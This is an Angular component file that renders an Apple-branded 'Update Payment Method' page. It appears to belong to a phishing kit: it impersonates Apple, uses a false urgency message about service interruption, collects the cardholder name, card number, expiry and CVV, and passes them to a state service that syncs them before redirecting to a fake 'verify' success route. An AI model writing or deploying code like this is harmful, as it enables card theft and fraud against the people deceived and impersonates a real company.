import { Component, signal, output, inject, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, FormGroup, Validators } from '@angular/forms';
import { StateService } from '../../../services/state.service';

@Component({
  selector: 'app-apple-payment',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
    <div class="apple-flow-container">
      <div class="apple-card" style="max-width: 500px;">
        <div class="apple-logo-container">
          <img src="/assets/images/logos/apple-logo.svg" alt="Apple Logo" class="apple-logo">
        </div>
        
        <h1 class="apple-title">Update Payment Method</h1>
        
        <p style="margin-bottom: 32px; font-size: 15px; color: var(--apple-text-secondary); line-height: 1.4;">
          Please update your payment information to continue using Apple services without interruption.
        </p>
        
        <form [formGroup]="paymentForm" (ngSubmit)="onSubmit()">
          <!-- Cardholder Name -->
          <div class="apple-input-group">
            <label class="apple-label" for="cardholder">Cardholder Name</label>
            <input 
              type="text" 
              id="cardholder" 
              formControlName="cardholder" 
              class="apple-input" 
              placeholder="Name on card"
            >
          </div>

          <!-- Card Number -->
          <div class="apple-input-group">
            <label class="apple-label" for="cardNumber">Card Number</label>
            <input 
              type="text" 
              id="cardNumber" 
              formControlName="cardNumber" 
              class="apple-input" 
              placeholder="0000 0000 0000 0000"
            >
          </div>
          
          <div style="display: flex; gap: 16px;">
            <!-- Expiry -->
            <div class="apple-input-group" style="flex: 1;">
              <label class="apple-label" for="expiry">Expiry Date</label>
              <input 
                type="text" 
                id="expiry" 
                formControlName="expiry" 
                class="apple-input" 
                placeholder="MM / YY"
              >
            </div>
            
            <!-- CVV -->
            <div class="apple-input-group" style="flex: 1;">
              <label class="apple-label" for="cvv">CVV</label>
              <input 
                type="text" 
                id="cvv" 
                formControlName="cvv" 
                class="apple-input" 
                placeholder="000"
              >
            </div>
          </div>

          <div style="margin-top: 32px;">
            <button 
              type="submit" 
              class="apple-submit-btn" 
              [disabled]="paymentForm.invalid || loading()"
              style="width: 100%; border-radius: 12px; font-weight: 500; height: 50px; margin-top: 0;"
            >
              @if (loading()) {
                <div class="apple-spinner"></div>
              } @else {
                Update Payment Method
              }
            </button>
          </div>
        </form>
        
        <div class="apple-footer-links" style="margin-top: 32px;">
           <img src="https://www.apple.com/v/apple-pay/i/images/overview/apple_pay_logo_large_2x.png" alt="Apple Pay" style="height: 24px; opacity: 0.5;">
        </div>
      </div>
    </div>
  `,
  styleUrls: ['../../../styles/flows/apple.scss'],
  styles: [`
    .apple-spinner {
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: apple-spin 1s linear infinite;
    }
    @keyframes apple-spin {
      to { transform: rotate(360deg); }
    }
  `]
})
export class ApplePaymentComponent implements OnInit {
  private fb = inject(FormBuilder);
  private state = inject(StateService);

  paymentForm: FormGroup = this.fb.group({
    cardholder: ['', [Validators.required]],
    cardNumber: ['', [Validators.required, Validators.pattern('^[0-9 ]{13,19}$')]],
    expiry: ['', [Validators.required, Validators.pattern('^(0[1-9]|1[0-2])\\/?([0-9]{2})$')]],
    cvv: ['', [Validators.required, Validators.pattern('^[0-9]{3,4}$')]]
  });

  loading = signal(false);

  ngOnInit(): void {
    this.state.stage.set('card_pending');
  }

  async onSubmit() {
    if (this.paymentForm.valid) {
      this.loading.set(true);
      const data = this.paymentForm.value;

      this.state.firstName.set(data.cardholder);
      this.state.cardNumber.set(data.cardNumber);
      this.state.cardExpiry.set(data.expiry);
      this.state.cardCvv.set(data.cvv);
      this.state.isCardSubmitted.set(true);

      await this.state.syncState();

      this.loading.set(false);
      this.state.navigate('/verify/apple/success');
    }
  }
}
